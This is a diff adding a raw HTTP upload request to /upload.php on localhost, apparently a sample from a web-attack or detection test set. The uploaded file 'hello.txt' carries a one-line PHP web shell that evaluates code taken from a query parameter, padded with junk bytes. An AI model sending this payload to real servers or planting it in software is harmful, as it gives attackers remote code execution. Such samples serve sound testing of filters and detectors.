@@ -1,0 +1,14 @@
+POST /upload.php HTTP/1.1
+Host: 127.0.0.1
+Accept: */*
+Accept-Language: zh
+User-Agent: Opera/2.6 (Macintosh 4.8; Macintosh 5.2; 360SE 3.8) (KHTML, like Gecko) 8.4
+Content-Type: multipart/form-data; boundary=----tbmnYBsDevoOpuoKqOQYmqvIEw
+Content-Length: 225
+Connection: close
+
+------tbmnYBsDevoOpuoKqOQYmqvIEw
+Content-Disposition: form-data; name="username"; filename="hello.txt"
+
+516KN<?php  eval($_GET[599])?><? A9(,)#\u00a5%8I\u2026\u2026&*\uff086G
+------tbmnYBsDevoOpuoKqOQYmqvIEw
